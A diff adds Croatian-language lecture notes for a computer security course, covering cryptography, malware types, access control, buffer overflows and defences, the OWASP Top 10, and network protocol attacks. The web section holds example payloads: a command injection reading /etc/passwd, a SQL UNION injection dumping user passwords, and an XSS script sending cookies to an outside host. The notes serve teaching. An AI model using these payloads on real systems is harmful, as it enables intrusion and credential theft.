@@ -1,0 +1,684 @@
+#1.
+Pojam sigurnosti ovisan o kontekstu.
+Sigurnost je kontinuirani proces čijim se provođenjem osigurava određeno stanje. Željeno stanje je definirano zahtjevima.
+Temeljni sigurnosni zathejvi: 
+    - tajnost
+    - integritet
+    - raspoloživost
+Dodatni sigurnosni zahtjevi:
+    - autentičnost
+    - neporecivost 
+
+Ako neki od zahtjeva nije ispunjen -> desio se incident / narušena je sigurnost
+Nešto je nesigurno != incident
+Da bi se desio incident mora postojati ranjivost i prijetnja.
+
+Nas zanima kibernetička sigurnost.
+Safety - karakteristika da sustav neće prouzročiti štetu
+Temeljni izvor problema u sigurnosti - čovjek
+
+Backdoor/stražnja vrata - svojsto sustava da omogućava pristup nekome tko ne bi smio imati pristup
+Covert channel/prikriveni kanal - komunikacijski kanal kojim se prenose podaci, a da toga nisu svjesni vlasnici ili legitimni korisnici sutava u kojemu se kanal javlja
+                                - npr. echo request/reply
+Side channel/sporedni kanal - komunikacijski kanal kroz koji prolaze dodatne informacije -> kanal je posljedica načina rada (implementacije) sustava
+                            - npr. potrošnja električne energije, vremenski odnosi
+
+#2.
+Kerckhoffov princip - kriptosustav mora biti siguran čak i kada su javno poznati svi detalji rada sustava osim samih ključeva
+                    - security-by-obsucrity NIJE DOBAR
+
+Plaintext/Porurka/Izvorni tekst/Otvoreni tekst
+Ciphertext/Šifrat/Skriveni tekst
+
+##Povijest:
+
+Cezarova šifra - gruba sila
+Supstitucijska šifra - frekvencijska analiza
+Vigenereova šifra - kasiskijev test + frekvencijska analiza
+
+##Simetrične šifre:
+
+Simetrična sifra je par algoritama E i D gdje vrijedi D(E(m,k),k) = m
+
+###One-time pad/Jednokratna bilježnica:
+E(m,k) = m XOR k
+D(m,k) = c XOR k
+Pruža savršenu povjerljivost -> šansa da pogodi poruku jednaka 1/|M|
+Nedostaci:
+    - ključ mora biti jednako velik kao i poruka
+    - ključ se smije koristiti najviše jednom
+    - ne štiti integritet (kao niti jedna šifra sama po sebi)
+    - malleable encryption - moguće je na predvidi način izmijeniti poruku 
+        - c1 = m1 XOR k
+        - c2 = m2 XOR k = m1 XOR m2 XOR k XOR m1 = m1 XOR m2 XOR c1 (nije potrebno poznavati ključ)
+
+Semantic security under chosen-plaintext attack/Semantička sigurnost od napada odabranim izvornim tekstom
+
+###Blok šifre:
+Plaintext u blokovima fiksne duljine
+DES, AES...
+
+###AES - Advanced Encryption Standard (Rijndael)
+Osigurava veliku difuziju tijekom rundi.
+
+###ECB - Elctronic Codebook
+Nedostatak difuzije -> otkriva uzorke u tekstu
+
+###CBC - Cipher Block Chaining
+Početni blok plaintexta se XOR-a s inicijalizacijskim vektorom koji se onda pomoću algoritma i ključa enkriptira.
+Svaki sljedeći blok se XOR-a s ciphertextom prošlog bloka koji se onda pomoću algoritam i ključa enkriptira.
+
+###Protočne šifre:
+Generator pseudoslučajnih probjeva na temelju ključa generira niz bitova koji se XOR-a s izvornim tekstom.
+CTR, Salsa20/ChaCha...
+
+###CTR - Counter Mode
+Nasumični inicijalizacijski vektor se pomoću algoritma i ključa enkriptira te se dobiveni tekst XOR-a s blokom plaintexta.
+Svaki sljedeći blok u algoritam unosi vrijednost prošlog inicijalizacijskog vektora nad kojim je još dodatno korištena neka inverzibilna operacije (npr. zbrajanje).
+
+###Kriptoanaliza blok šifri
+Efektivna veličina ključa je b ako najbolji poznati napad radi rad veličine 2**b koraka
+Linearna kriptoanaliza - iskorištava linearne zavisnosti pjedinih bitova poruke, ključa i šifrata
+Diferencijalna kriptoanaliza - analiza kako promjena poruke utječe na promjene šifrata, posebno analiza S-kutija (jedini nelinearni dio šifre)
+
+##Hash/Kriptografska funkcija sažetka
+Deterministički algoritam koji porizvoljnoj poruci pridružuje sažetak fiksne duljine.
+Želimo da se ponaša kao da je potpuno slučajna i da bude otporna na kolizije.
+Primjena:
+    - integritet 
+    - zaštita zaporki
+    - deriviranje ključeva iz zaporki
+    - generiranje pseudoslučajnih projeba
+    - digitalni potpisi
+    - proof-of-work...
+Paradoks rođendana - potrebno oko 1.2*2**(n/2) iteracija do kolizije
+?Merkle-Damgard konstrukcija
+
+#3.
+##Integritet poruke
+MAC - Message Authentication Code
+HMAC - MAC pomoću hash funkcije
+     - HMAC(m,k) = H(k XOR opad || H(k XOR ipad || m))
+CBC-MAC - MAC pomoću blok šifre
+
+Encrypt-and-MAC - generalno nesigurno
+MAC-then-Encrypt - može biti nesigurano, POODLE napad
+Encrypt-then-MAC - sigurno
+Ključevi enkripcije i MAC MORAJU BITI RAZLIČITI!
+
+Autentificirana šifra - pruža svojstva povjerljivosti i integriteta u jednom paketu
+                      - npr. AES-GCM
+
+##Asimetrične šifre
+Primatelj ima dva ključa:
+    - javni ključ - služi za šifriranje
+    - privatni ključ - služi za dešifriranje
+npr. PGP/GPG, TLS
+
+Sustav krpitiranja javim ključem (SKJK) je trojka algoritama G, E i D gdje:
+    - G - algoritam koji generira par ključeva pk i sk
+    - vrijedi - D(E(m,pk),sk) = m
+SKJK - siguran ako je teško na temelju skrivenog teksta odrediti bilo što o izvronom tekstu, čak i uz chosen-plaintext i chosen-ciphertext attack
+npr. RSA
+
+##RSA
+Eulerom teorem: Za svaki prirodni broj N i za svaki alfa element Z*(N) vrijedi alfa**fi(N) = 1 u Z(N)
+Fermatov teorem: Za svaki prosti broj p i za svaki alfa element Z*(N) vrijedi alfa**(p-1) = 1 u Z(p)
+Generiranje ključeva:
+    1. Odaberemo velike slučajne proste brojeve p i q
+    2. Izračunamo N = p * q
+    3. Izračunamo fi(N) = (p-1)(q-1)
+    4. Odaberemo proizvoljni e element Z*(fi(N)) [u praksi e = 65537, broj s malom hammingovom težinom - tj. broj sa što više 0]
+    5. Izračunamo d = e**(-1) u Z*(fi(N))
+    6. Javni ključ: pk = (e,N)
+    7. Privatni ključ: sk = (d,N)
+RSA je nesiguran ako je moguće N efikasno rastaviti na faktore ili je moguće efikasno izračunati fi(N).
+Algoritam E: E(m,(e,N)) = m**e u Z(N)
+Algoritam D: D(c,(d,N)) = c**d u Z(N)
+D(E(m,(e,N)),(d,N)) = D(m**e,(d,N)) = m**ed = m**(1 + k*fi(N)) = m * 1**k = m u Z(N)
+RSA nije siguran sustav kriptiranja javnim ključem ni pod chosen-plaintext ni pod chosen-ciphertext napadom.
+    -> 1 je uvijek 1 neovisno o ključevima
+    -> kriptiranje malih blokova (npr. 1 bajt), možemo deterministički izračunati svih 256 mogućih kombinacija ciphertexta
+    -> zaključak: RSA gotovo nikad ne koristi za kriptiranje podataka već za kriptiranje ključeva i materijala za ključeve
+Plaintext se uvijek nadpounjuje na zadanu veličinu.
+
+##Digitalni potpisi
+Autentičnost, integritet, neporecivost.
+Digitalni potpis je trojka algoritama G, S i V gdje:
+    - G - algoritam koji generira par ključeva pk i sk
+    - vrijedi - V(m, S(p,sk), pk) = 1 ili 0
+Digitalni potpis NIJE enkripcija sažetka poruke privatnim ključem.
+
+Ako je H kriptografska funkcija sažetka i Pad funkcija nadopunjavanja:
+Algoritam S:
+    S(m,sk) = Pad(H(m))**d u Z(N)
+Algoritam V:
+    V(m, S(m,sk), pk) = ( Unpad(S(m,sk)**e u Z(N)) == H(m) ) ? 1 : 0
+
+#4.
+Prijetnja je bilo koja okolnost ili događaj koji ima potencijal narušiti sigurnost sustava ili informacije.
+
+Izvor prijetnje je onaj koji je potaknuo prijetnju.
+Agent prijetnje je subjekt koji provodi prijetnju.
+Napad je kombinacija izvora prijetnje, namjere, prijetnje i posljedice.
+
+Izvori prijetnji:
+    - APT/Napredne ustrajne prijetnje
+        - dijelovi obavještajnih službi ili dio vojne organizacije
+        - neograničene količine resursa
+        - ciljevi su određeni državnim interesima
+        - prikrivaju svoju prisutnost
+    - kibernetički kriminalci
+        - motiv je novac - gledaju potrošiti što manje resursa kako bi maksimizirali profit
+        - krađa podataka, prodaja ilegalne robe i usluga, ucjenjivanje, prijevare...
+    - haktivisti
+        - slabo povezana grupa anonimaca
+        - promoviraju političke i svjetonazorske stavove
+        - žele slavu (trude se biti što vidljiviji)
+    - pojedinačni napadači
+        - grey hats, black hats, white hats
+            - napadači potencijalno vrlo velikih vještina i kompetencija
+        - script kiddies
+    - automatizirane probe
+        - skeneri i crvi
+
+Cyber Kill Chain - najpoznatiji model napada
+    1. Istraživanje
+    2. Naoružavanje.
+    3. Isporuka
+    4. Iskorištavanje
+    5. Instalacija
+    6. Uspostava upravljačkog kanala (C2)
+    7. Djelovanje
+
+#5.
+Zloćudna funkcionalnost je sklopovlje, firmware ili programska podrška koja je namjerno uključena ili ubačena u sustav radi štetnih ciljeva
+    -> mi se bavimo zloćudnim kodom = malware
+Klasifikacija zloćudnog koda - način širenja, način pokretanja, monolitni/modularni, platforma, perzistencija, načini prikrivanja, zločudna funkcionalnost
+Često spominjani zloćudni kod:
+    - virus - šire se tako što se ubacuj u izvršne kodove legitimnih programa
+    - crvi - mogu se samostalno širiti putem mreže
+    - downloader - skida i instalira neki drugi zloćudni kod
+    - dropper - sadrži drugi zloćudni kod te ga postavlja na kompromitirano računalo
+    - logiča bomba - obavlja zloćudnu akotivnost kada se ispune odrđeni uvjeti
+    - spyware - izvlači podatke korisnika računala
+    - RAT(alat za udaljen pristup) - ne mora nužno biti zloćudni kod (downloader instalira TeamViewer)
+    - trojanci - pretvaraju se da obavljaju neku korisnu funkciju dok u biti sadrže maliciozni teret
+    - ransomware - pokušava ucjeniti vlasnika kompromitiranog računala
+Zloćudni kod u podacima -> shellcode - može navesti procesor da počne tretirati te podatke kao instrukcije
+
+Reverzno inženjerstvo zloćudnog koda - sandbox, debugger, statička analiza (dekompajleri)
+
+C&C poslužitelj - poslužitelj kojem se javljaju kompromitirana računala 
+                - štiti napadača od otkiravanja
+
+Botnet - skup zaraženih račuanal kojima upravlja botmaster
+       - Botmaster <-> C&C poslužitelji <-> botovi
+
+#6.
+Kontrola pristupa sastoji se od dva koraka:
+    - autentifikacija - proces provjere identiteta subjekta
+    - autorizacija - proces odlučivanja može li subjekt obaviti točno određenu operaciju nad objektom
+
+Autentifikacija - temelje se na jednom ili kombinaciji više faktora (1FA, 2FA, MFA)
+                - lozinke, dijeljene tajne, fraze, jednokratne lozinke, pametne kartice, biometrijski podaci
+
+Sigurna pohrana lozinki: 
+    1. svakoj lozinki se dodaje slučajna vrijednost
+    2. slučajna vrijednost i lozinka se propuštaju kroz kriptogrfski hash
+    3. na disk se pohranjuju slučajna vrijednost i rezultat kriptografskog hasha
+        - onemogućava da ista lozinka ima isti zapis u bazi, napade korištenjem rainbow tables
+
+Izazov-odgovor način provjere: (rješava problem prijenosa lozinke preko interneta, no zahtijeva spremanje lozinke u plaintext formatu)
+    1. Poslužitelj šalje slučajan broj klijentu
+    2. Korisnik upisuje korisničko ime i lozinku
+    3. Klijent slučajan broj i lozniku propušta kroz funkciju sažetka
+    4. Korisničko ime i rezultat funkcije sažetka se šalju na poslužitelja
+    5. Poslužitelj na temelju korisničkog imena dohvaća pohranjenu lozinku te izračunava funkciju sažetka na temelju lozinke i slučajnog broja kojeg je poslao klijentu
+    6. Ako je izračunala vrijednosti ista kao i primljena verzija autentifikacija je uspješna
+
+Autorizacija bazirana na dozvolama:
+    - defualtna odluka bi trebala biti odbijanje
+    - pristupne liste
+
+Autorizacija bazirana na ulogama:
+    - u praksi veća flesibilnost i upravljivost
+    - prava se grupiraju u uloge, a uloge se dodjeljuju subjektima
+
+#7
+Defenzivno programiranje - čak i u potpuno nezaumnim okolnostima i za potpuno nerazumne ulaze, program se ne smije ponašati nerazumno
+
+Provjera ispravnosti ulaza:
+    - provjera sintakse:
+        - ulaz ispravne veličine
+        - ulaz ispravno formatiran
+    - provjera semantike
+        - ima li ulaz smisla u kontekstu programa
+        - npr. heartbleed
+
+Buffer overflow/Preljev međuspremnika:
+
+MEMORIJA(Linux x86-64):
+------------------------------------
+Program i trajni podaci (code, text)
+------------------------------------
+Gomila (heap)
+------------------------------------
+    |
+    V
+
+------------------------------------
+Dijeljene biblioteke
+------------------------------------
+
+    A
+    |
+------------------------------------ %rsp
+Stog (stack)
+------------------------------------
+
+
+POZIVANJE FUNKCIJE NA STOGU:
+------------------------------------ %rsp
+...
+Lokalna varijabla 2
+Lokalna varijabla 1
+------------------------------------
+Spremljeni %rbp
+------------------------------------
+Adresa za povratak
+------------------------------------
+...
+Parametar poziva 2
+Parametar poziva 1
+------------------------------------ %rbp
+Opsinik funkcije f
+------------------------------------
+
+Iskorištavanje ranjivosti npr: "Stjepan <kod>..<adresa>"
+    - napadač kao ulaz daje strojni kod te njegovu očekivanu adresu
+    - adresa se mora prepisati na adresu za povratak spremljenu na stogu -> nakon ret izvršava se kod napadača
+
+Kako pogoditi adrese? -> nop sanjke
+Napadač na temelju strojnog koda može znati kako izgleda opisnik funkcije no ne zna točnu adresu vrha stoga.
+-> prije samog koda staviti dugačak niz nop instrukcija -> dovoljno je da napadač pogodi približnu adresu koda
+
+------------------------------ %rsp
+0xFF
+0xFF
+..
+0xFF
+------------------------------
+Približna adresa početka koda |---------
+------------------------------ %rbp    |
+NOP                                    |
+NOP                                    |
+... <-----------------------------------
+NOP
+NOP
+shellcode
+------------------------------
+
+Obrana: write xor execute - memorijske stranice koje sadrže podatke se ne smiju izvršavati (NX bit)
+                          - općenito ako se u memorijsku stranicu može pisati, onda se nikada ne može izvršavati kao kod - i obratno
+Zaobilaženje obrane - poziva se postojeća funkcija (npr. iz libc execve()) -> return oriented programming
+Obrana: randomizacija memorisjkog prostora - ASLR (address space layout randomization)
+                                           - adrese memorijskih stranica su (djelomično) slučajno odabrane (u 32-bitnim sustavima premalo entropije)
+Obrana: kanarinci na stogu - prevoditelj generira kod koji prilikom pozivanja funkcije stavlja na stog određenu vrijednost nepoznatu napadaču
+                           - prije završetka funkcije provjerava je li točno ta vrijednost još uvijek na stogu
+
+Kako spriječiti buffer overflow?
+    - ne koristiti nesigurne funkcije ( libc - scanf, gets, strcpy..)
+    - alati za analizu koda
+    - pisati u memorijski sigurnom jeziku (Rust, Go, Java)
+
+#8
+Statička analiza koda - analiza izvornog koda
+Dinamička analiza koda - analiza binarnog (izvršnog) koda
+
+Strogo tipizirani jezik - strog u definiranju i rukovanju podataka
+                        - provjerava kod prilikom prevođenja ili tijekom izvođenja
+
+SDLC - Secure Development LifeCycle
+Smjernice za siguran dizajn:
+    - minimizacija prostora za napad - ne dodavati funkcionalnost koje zapravo nisu potrebne
+    - definiranje sigurnih početnih postavki - password policy
+    - princip najmanje prava - korisnici/dijelovi sustava/servisi bi trebali imati samo ona prava na resurse koji im doista trebaju
+    - princip obrane u dubinu - više neovisnih mehanizama koji štite isti dio sustava
+    - sigurno ispadanje - fail open ili fail close
+    - ne vjerujte vanjskim servisima - provjera valjanosti
+    - razdvajanje zaduženja - administratori ne bi smjeli imati ulogu običnih korisnika
+    - izbjegavajte sigurnost prikrivanjem
+    - jednostavna sigurnost - pretjerana i neatomizirana obfuskacija koda
+    - ispravne sigurnosne zakrpe
+
+OS - program ili skup programa koji povezuje i objedinjuje sve sklopovske dijelove računala, omogućuje njihovu djelotvornu upotrebu
+   - podloga svim ostalim programima
+   - višekorisnički rad
+   - osnovne metode: razdvajanje i dijeljenje
+
+Razdvajanje - objekti jednog korisnika nisu vidljivi drugom korisniku
+            - sandboxing
+
+Dijeljenje - različite razine
+
+Ovlasti(Linux/MacOS)
+    - 3 skupine ovlasti:
+        - owner - u
+        - group/staff - g
+        - other/all/everyone - o,a
+    - 3 skupine akcija:
+        - čitanje - r
+        - pisanje - w
+        - pokretanje - x 
+        - bez ovlasti - "-"
+Tipovi memorija:
+    - "-" - datoteka
+    - d - direktorij
+    - l - link, veza na datoteku
+Standardni način imenovanja: 
+    - rwx za svaku ulogu -> rwxrwxrwx (owner, group, other)
+    - brojevne reference - oktalno (read - 4, write - 2, execute - 1)
+
+OS djelomično rade i sandboxing(razdvajanje) 
+-> memorija:
+    - user space - dio memorije u kojem se izvode korisnički programi
+                 - dodatno razdvajanje samih usera
+                 - pristup jezgrenom dijelu isključivo kroz sistemske pozive
+    - kernel space - dio memorije u kojem se izvodi jezgra sustava
+                   - ima pristup čitavoj memoriji
+
+Sandboxing - koncept kod kojeg se svaki proces/aplikacija izvodi u svojem pješčaniku
+           - za izlazak iz pješčanika potrebna posebna dozvola
+           - princip najmanjih prava
+           - MacOS
+
+Linux rješenje: 
+    - namespace - izolacija procesa u smislu pristupa resursima
+                - definira čemu sve proces može pristupiti i kako vidi resurse
+    - seccomp - proces se prebacuje u siguran način rada 
+    - seccomp-bpf - smanjuje strogoću Seccomp
+    - firejail, docker
+
+Windows:
+    - UAC
+    - windows sandbox (ne u sigurnosnom simslu)
+
+#9
+Dvije strane sigurnosti web aplikacija:
+    -preglednik: keylogger, botnet, privatni podaci
+    -aplikacija: XSS, XSRF, SQL injection
+
+Lokot u pregledniku -> autentifikacija poslužitelja
+IDN homographic attack - URL sadrži unicode znakove - čirilica
+
+HTTP - stateless -> web aplikacije održavaju stanje -> cookie, korisničke sjednice, skrivene varijable, url parametri...
+
+URL struktura:  schema :// hostname / put ? query string
+
+OWASP top 10 ranjivosti:
+A1 - umetanje
+A2 - loša autentifikacija
+A3 - nesigurna pohranja osjetljivih podataka
+A4 - XXE - vanjski XML entiteti
+A5 - loša kontrola pristupa
+A6 - loše sigurnosne postavke
+A7 - XSS - cross site scripting
+A8 - nesigurna deserijalizacija
+A9 - ranjive komponente 
+A10 - nedovoljan nadzor
+
+### A1 - umetanje
+Slanje teksta s malicioznom namjenom (SQL injection, naredbe..)
+-> Aplikacije tekst interpretiraju kao naredbe ili upite
+
+postupak: 
+    tautologija (iskaz koji je uvijek istinit) -> 
+    ilegalni upiti (struktura tablice i baze) -> 
+    injekcija na slijepo (legitimnost izraza) -> 
+    union (izvlačenje podataka)
+
+Npr:
+    bash - 1 | cat /etc/passwd
+    sql - '  ' OR 1 = 1 UNION SELECT user, password FROM users WHERE '1' = '1  '
+
+Zaštita: izbjeć interpretaciju naredbi, pripremljene naredbe, validacija, whitelisting, filteri, minimizacija ovlasti, ne ispisivati greške
+
+### A2 - loša autentifikacija
+Cilj je pogoditi ime i lozinku ili ukrasti identifikator sjednice
+-> Pogađanje lozinke pomoću bruteforce ili rječnika.
+
+Napad može biti vertikalan (sve lozinke za 1 korisnika, admina) ili horizontalan (1 lozinka za sve korisnike)
+
+Zaštita:
+    - CAPTCHA
+    - ograničenje pokušaja prijave
+    - filtriranje IP adresa
+    - ispravne poruke o grešci (ne otkrivati infromacije o postojanosti profila)
+
+Identifikator sjednice - nasumičan niz znakova koji stvara poslužitelj, osobno ga pohranjuje i šalje korisniku. Svi sljedeći zahtjevi koriste dobiveni identifikator sjednice
+Tokeni - sastoje se od privremenih i dugotrajnih tokena
+
+HTTPOnly zastavica - cookieju možemo pristupiti isključivo poslužitelj kroz HTTP
+
+### A3 - nesigurna pohrana osjetljivih podataka
+Propust osjetljivih podataka, mjesta na kojima se nalaze i njhiove zaštite.
+Verifikacija arhitekture, zaštita prikladnim mehanizmima, prikladna upotreba mehanizama zaštite, ne pohranjivati nepotrebne podatke..
+
+### A4 - XXE - vanjski XML entiteti
+Ranjivost pasiranja XML datoteka (omogućeno učitavanje vanjskih entiteta)
+Izbjegavati korištenje složenih XML struktura, ažuriranje postavki parsera, validacija.
+
+### A5 - loša kontrola pristupa
+Propust zaštite neprikazanih stranica
+npr. user/getAccounts -> admin/getAccounts, ?id=444 -> ?id=1
+Moguća eliminacija referenci, provjera formata, prava pristupa, vrte pristupa (pisanje, čitanje..)
+Svaki URL - dopustiti pristup samo autentificiranim korisnicima, kojima se provjeravaju ovlasti
+
+### A6 - loše sigurnosne postavke
+Zaštita sustava na kojem se nalazi aplikacija.
+Promjena okruženja u produkcijsko.
+Onemogućiti pristup sigurnosno važnim dokumentima.
+Integracijsko testiranje i periodičko skeniranje.
+Konfiguracija web poslužitelja: npr. .htaccess za Apache
+
+Same origin policy - politika istog izvorišta, onemogućiti pristup resursima s drugih stranica -> CORS, JSONP
+
+### A7 - XSS - cross site scripting
+Podaci od napadača šalju se korisniku u preglednik, podaci su unutar baze podataka, rezultat unosa u obrazac...
+2 vrste:
+    - Reflektirani - XSS je dio URL-a i dovoljna je samo poveznica da se XSS izvede
+    - Pohranjeni - XSS se pohranjuje na poslužitelju (najcesce kao unos obrasca)
+
+npr:
+    <script> document.location.href='http://public.tel.fer.hr/' + document.cookie </script>
+    <script> alert(document.cookie) </script>
+
+Zaštita: filtriranje <script> i sličnih tagova, whitelisting znakova, POST, HTTPOnly Cookie
+
+### A8 - nesigurna deserijalizacija
+Problem ako ne provjeravamo serijalizirane podatke
+Ne vjerovati korisniku, ne slati osjetljive podatke, provjeravati tipove podataka.
+
+### A9 - ranjive komponente
+Pratiti sigurnosne zakrpe i novootkrivene ranjivosti.
+Sigurnosne politike i sigurnosni omotači.
+
+### A10 - nedovoljan nadzor
+Većina napada podrazumijeva puno propalih pokušaja koje će u pravilu uzorkovati greške u logovima
+Uz zapisivanje bitan je i pametan nadzor
+Log monitoring i alerting, application level firewall.
+
+#10
+Model prijetnje na internetu:
+    - krajnje točke nisu komprimitirane
+    - napadač ima potpunu kontrolu nad komunikacijskim tokom -> može neprimjetno čitati, uklanjati, mijenjati i ubacivati podatke
+
+Komunikacijska sigurnost - prijetnje:
+    - presretanje, prisluškivanje
+    - prekidanje, uskraćivanje
+    - promjena, kašnjene
+    - umetanje, ponavljanje
+    - lažno predstavljanje
+
+Čovjek u sredini - pristunost svih prijetnji, napadač se nalazi između točke A i B, nabolji položaj za napadača
+
+Ranjivosti: 
+    - fizička ranjivost 
+    - ranjivost u protokolima 
+    - ranjivost u implementacji 
+    - ranjivost u konfiguraciji i korištenju
+
+## Ranjivost protokola
+Napravljeni u vrijeme kada sigurnost nije bila visoko na listi prioriteta
+
+ARP - pretvara 32bitne IP adrese u 48bitne MAC(Ethernet) adrese
+    - A šalje broadcast ARP zahtjev na mrežu, B odgovara ARP odzivom
+    - nema mehanizam autentifikacije -> moguće je poslati odgovor prije pravog računala s lažnim preslikavanjem adresa, također je moguće slanje čistih lažnih ARP odgovora
+    - potrebno kontinuirano slanje da se održe u cacheu
+    - zaštita: switch s mogućnostima zaključavanja priključaka, ručna konfiguracija ARP-a
+
+IP - ne nudi zaštitu podataka
+   - IP spoofing - slanje IP datagrama s lažnom adresom pošiljatelja (koju primatelj smatra sigurnom) -> koristi se pri DDoS-u
+   - IP fragmentacija - može zavarati vatrozide i sustave za detekciju uljeza
+                      - ping of death - ICMP echo request fragmentirani IP datagram ukupne duljine veće od 65535 okteta -> buffer overflow
+                      - teardrop - dva fragmenta koja se međusobno prekrivaju - crash Linux kernela
+                      - TCP overwrite - prepisivanje zaglavlja, npr. porta
+
+ICMP - u pravilu DoS napadi, ICMP redirect za zlonamjerno preusmjeravanje, ICMP poruka o nedostižnom odredištu, prikriveni kanali, enumeracija računala na mreži
+     - napad "smurf" - slanje echo zahtjeva na broadcast adresu posredničke mreže s lažnom adresom izvorišta jednakom adresi žrtve
+
+DHCP - automatska dodjela adresa i mrežnih parametara, DHCPDISCOVER -> DHCPOFFER -> DHCPREQUEST -> DHCPACK
+     - bilotko može slati i primati DHCP poruke -> lažirani DHCP poslužitelj - DoS napad
+
+UDP - nepouzdan prijenos podataka, nema kontrole toka
+    - UDP spoofing - IP adresa jedini način identifikacije u protokolu UDP
+    - UDP hijacking - odgovara na klijentov UDP zahtjev prije poslužitelja, nema identifikacije paketa
+    - UDP storms - echo, chargen, daytime, time - izvorišna adresa adresa žrtve port 7 - echo -> UDP amplification
+    
+TCP - pouzdan, obostrana veza
+    - SYN, ACK, SEQ, FIN, URG, PSH, RST 
+    - početak: SYN -> SYN, ACK -> ACK
+    - kraj: FIN, ACK -> ACK
+    - SYN flood:
+        - po primitku SYN rezerviraju se resursi, poluotvoreno stanje veze
+        - napadač mora koristiti adresu s koje neće stići odgovor (da izbjegne RST odgovor)
+        - zaštita: SYN cookies
+    - napad na TCP:
+        - bitan položaj napadača:
+            - na putu TCP segmenata - MITM napad, jedina zaštita IPsec, TLS ne štiti od DoS
+            - van puta TCP segmenata - napadač mora pogađati parametre komunikacije
+                                     - RST i FIN napadi - problem pogađanja parametara TCP veze
+
+#11
+VPN - stvaranje privatnih mreža nad infrastrukturom Interneta
+    - PPTP, OpenVPN, WireGuard, IPsec, TLS
+    - vrste:
+        - od točke do točke (site to site) - između dva entiteta (usmjeritelja)
+        - udaljeni pristup (remote access) - između uređaja i usmjeritelja
+
+PPTP - point to point tunneling protocol
+     - koristio se za spajanje računala na korporativnu mrežu, danas nesiguran
+
+IPsec - rješenje na mrežnom sloju
+      - služi za povezivanje 2 ili više mreža, osobnih računala na korporativnu mrežu ili povezivanje 2 računala međusobno
+      - definira ponašanje krajnjih točaka (SPD i SAD) i korištene protokole (ESP, AH, IKE)
+      - tunelski i prijenosni način rada
+      - autentifikacija pomocu certifikata, dijeljene tajne ili EAP
+
+SPD - definira što se treba zaštiti (način tunelski ili prijenosni, selektori...)
+SAD - definira kako treba štiti (kriptografski algoritmi i ključevi)
+ESP - zaštita tajnosti, integriteta i autentičnosti (prijenosni ili tunelirajući)
+AH - začtita itegriteta i atuentičnosti (prijenosni ili tunelirajući)
+IKE - uspostava ključeva, autentifikacija..
+
+Digitalni certifikati - sadrži ključ i ostale informacije o subjektu, izdavatelju i valjanosti - subjekt je naziv računala ili osobe kojoj certifikat pripada
+                      - CA - certificate authority - izdavatelj certifikata - izdaje i digitalno potpisuje certifikate
+                                                                            - certifikati svih poznati izdavatelja ugrađeni su u preglednike    
+                      - RA - registration authority - identifikacija i autentifikacija osobe, dopuštenje izdanja certifikata osobi
+                      - DN - distinguished name - istaknuto ime - unikatno ime osobe, organizacije, poslodavca
+                      - CRL - certificate revocation list - lista opozvanih certifikata - u certifikatu navedene adrese i način pristupa CRL, sadrži listu opozvanih certifikata s vremenom i razlogom
+
+TLS - služi za zaštitu komunikacije
+    - pretpostavka - krajnje točke komunikacije su sigurne, ostalo pod kontrolom napadača, ne štiti od DoS
+    - potvrda identiteta poslužitelja i zaštita tajnosti i integriteta komunikacije, podržava i autentifikaciju klijenta certifikatom
+    - napadi - Heatbleed (ranjivost implementacije OpenSSL)
+             - SSL Stripping (MITM napad koji uklana SSL/TLS)
+             - BEAST (iskorištava predvidivi IV u CBC)
+             - CRIME
+             - POODLE - CBC
+    - TLS 1.3 > TLS 1.2
+    - minimalno 2048 bita za RSA, 256 bit ECDSA
+
+DoS/DDoS napadi
+    - bilo koje ograničeno sredstvo može biti cilj napada
+    - napadi preplavljanja - UDP promet, ICMP preplavljivanje, DNS preplavljivanje, VoIP preplavljivanje...
+    - preplavljivanje koje iskorištava karakteristike protokola - TCP SYN, TCP SYN-ACK, ACK & PUSH ACK, RST, FIN...
+    - reflkektirajući napadi preplavljivanja - smurf napad
+    - napadi preplavljivanja s pojačanjem - DNS, NTP
+
+#12 
+Udaljeno otkrivanje aplikacija - skeniranje pristupa kako bi se utvrdilo koji su otvoreni
+    - TCP - TCP connect - uspotavlja vezu u potpunosti te je odmah prekida, uspostva postoji, RST ne postoji
+          - TCP SYN - poluotvoreno skeniranje, SYN+ACK postoji, RST ne postoji
+          - TCP FIN - nema odgovora postoji, RST ne postoji
+          - fragmentacijom možemo izbjegavati detekciju skeniranja
+    - UDP - slanje praznog datagrama, nema odgovora postoji, ICMP port unreachable ne postoji
+          - nepouzdanost UDP problem za napadača, također ograničenje brzine slanja ICMP poruka
+          - vrlo spora tehnika skeniranja
+
+Radi lakšeg iskorištavanja aplikacije detekcija verzije aplikacije i operacijskog sustava
+-> problem u slučaju zakrpa, popravljenje ranjivosti, a starija verzija aplikacije
+Detekcija OS na temelju snimanju ponašanja mrežnog stoga
+
+Zaštita pogađanja grubom silom - velika entropija lozinke, ograničavnja broja pokušaja, PKI, 2FA, pohrana sažetaka lozinki...
+Zaštita nešifriranih podataka - IPsec, TLS, tuneliranje sa SSH, noviji protokoli
+
+Udaljeni rad: SSH 
+SSH Transport Layer Protocol - dogovara način razmjene ključeva, asimetrični algoritam šifriranja, simetrični algoritam šifriranja, algoritam za autentifikaciju poruka i algoritam kriptografskog sažetka
+    - autentifikacija korisničkim imenom i lozinkom, asimetričnom kriptografijom...
+    - usluge: udaljen rad, prijenos datoteka, tuneliranje Ethernet okvira ili IP datagrama (VPN), prosljeđivanje lokalnih i udaljenih pristupa
+
+Napad na DNS:
+    - svrha: sprječavanja pristupa usluzi, MITM napad, podmetanje lažnih sjedišta, preuzimanje domene
+    - presretanje paketa - MITM napad, slanje lažnih odgovora prije legitimnih (UDP)          
+                         - nemogućnost IPsec/TLS zaštite
+    - pogađanje ID vrijednosti i prdviđanje upita
+    - trovanje priručne memorije DNS-a - name chaining
+                                       - zaštita TSIG, DNSSEC
+    - DNS over TLS/HTTPS
+    - dosta toga skipano
+
+Vatrozid - provodi sigurnosnu politiku kontrolom pristupa, svaki paket koji prolazi provjerava se bazom pravila koja određuju što raditi s paketom
+         - sa i bez stanja
+         - segmentacija na razine povjerljivosti - DMZ demilitarizirana zona - s jednim ili dva vatrozida
+         - privatna mreža --- ||vatrozid|| --- DMZ --- ||vatrozid|| --- javna mreža
+         - primjer: netfilter/iptables - održavanje stanja
+npr.
+    iptables -A FORWARD -p tcp -s 10.0.0.20 -d 10.0.1.10/24 --dport 22 -j ACCEPT
+    iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+    iptables -A INPUT -i eth0 -p tcp --dport 443 -d 192.168.0.1 -m state --state NEW -j ACCEPT
+    iptables -A INPUT -i eth0 -s 10.0.1.0/24 -j DROP
+
+IDS - sustavi za detekciju upada
